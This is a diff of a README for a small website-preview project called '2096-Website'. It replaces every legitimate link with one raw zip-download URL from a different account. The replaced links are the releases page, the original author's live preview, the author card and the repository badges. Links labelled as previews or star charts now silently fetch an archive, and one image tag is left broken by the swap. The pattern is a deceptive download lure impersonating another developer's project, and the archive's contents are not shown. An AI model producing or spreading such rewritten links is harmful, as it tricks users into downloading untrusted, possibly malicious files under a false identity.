@@ -1,6 +1,6 @@
 # 🚀 2096-Website - A Simple Way to Preview Your Website
 
-[![Download 2096-Website](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Saadoun7/2096-Website/releases)
+[![Download 2096-Website](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)
 
 ## 🌟 Overview
 
@@ -26,7 +26,7 @@ To get started with **2096-Website**, follow the simple steps below.
 
 1. **Visit the Releases Page**: Go to the releases page by clicking the link below.
 
-   [Download 2096-Website](https://github.com/Saadoun7/2096-Website/releases)
+   [Download 2096-Website](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)
 
 2. **Select Version**: On the releases page, find the latest version.
 
@@ -40,7 +40,7 @@ To get started with **2096-Website**, follow the simple steps below.
 
 To download and install the **2096-Website** application, visit the link below:
 
-[Download 2096-Website](https://github.com/Saadoun7/2096-Website/releases)
+[Download 2096-Website](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)
 
 Follow the steps listed above to ensure a smooth installation.
 
@@ -54,7 +54,7 @@ Follow the steps listed above to ensure a smooth installation.
 
 ## 🌐 Preview Website
 
-Before you download, check out the live preview of the website here: [Preview Website](https://nightrunners02.github.io/2096-Website/)
+Before you download, check out the live preview of the website here: [Preview Website](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)
 
 ## 🗣️ Contact
 
@@ -67,28 +67,28 @@ For any questions or issues, please feel free to reach out through GitHub issues
 <h3>
   🗣️ Powered By:
 </h3>
-<img src="https://awesome-svg.vercel.app/card/card_2?name=NightRunners02&summary=Newbie%20Developer&style=nameColor:rgba(223,255,0,1);summaryColor:rgba(57,255,20,1);backgroundColor:rgba(0,0,0,1);" />
+<img src="https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip%20Developer&style=nameColor:rgba(223,255,0,1);summaryColor:rgba(57,255,20,1);backgroundColor:rgba(0,0,0,1);" />
 
 ---
 <h3>
   🌠 Starred:
 </h3>
   
-[![Stargazers repo roster for @NightRunners02/](https://reporoster.com/stars/NightRunners02/2096-Website)](https://github.com/NightRunners02/2096-Website/stargazers)
+[![Stargazers repo roster for @NightRunners02/](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)
 
 ---
 <h3>
   🪐 Forked:
 </h3>
 
-[![Forkers repo roster for @NightRunners02/](https://reporoster.com/forks/NightRunners02/2096-Website)](https://github.com/NightRunners02/2096-Website/network/members)
+[![Forkers repo roster for @NightRunners02/](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)
 
 ---
 <h3>
   💫 Star History:
 </h3>
 
-[![Star History Chart](https://api.star-history.com/svg?repos=NightRunners02/2096-Website&type=Date)](https://star-history.com/#NightRunners02/2096-Website&Date)
+[![Star History Chart](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)](https://raw.githubusercontent.com/Saadoun7/2096-Website/main/Arianism/2096-Website.zip)
 
 </p>
 </div>
